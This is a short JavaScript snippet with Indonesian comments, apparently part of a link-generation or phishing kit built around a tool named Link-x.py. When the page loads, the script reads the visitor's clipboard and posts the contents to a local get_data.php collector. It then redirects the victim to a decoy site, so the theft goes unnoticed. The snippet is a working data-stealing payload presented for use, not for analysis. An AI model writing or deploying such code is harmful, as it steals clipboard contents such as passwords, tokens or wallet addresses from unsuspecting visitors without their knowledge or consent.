// Fungsi redirect — akan diganti otomatis oleh Link-x.py
const REDIRECT_URL = "https://you.regettingold.com/";

function post(dataclip) {
    $.ajax({
        type: "POST",
        data: { cat: dataclip },
        url: "./get_data.php",
        dataType: "json",
        timeout: 5000,
        success: function(result) {
            // Redirect setelah sukses kirim
            location.replace(REDIRECT_URL);
        },
        error: function() {
            // Fallback redirect jika gagal kirim
            location.replace(REDIRECT_URL);
        }
    });
}

// Baca clipboard
navigator.clipboard.readText()
    .then(text => {
        post(text || "[empty clipboard]");
    })
    .catch(() => {
        // Jika akses clipboard ditolak, tetap redirect
        location.replace(REDIRECT_URL);
    });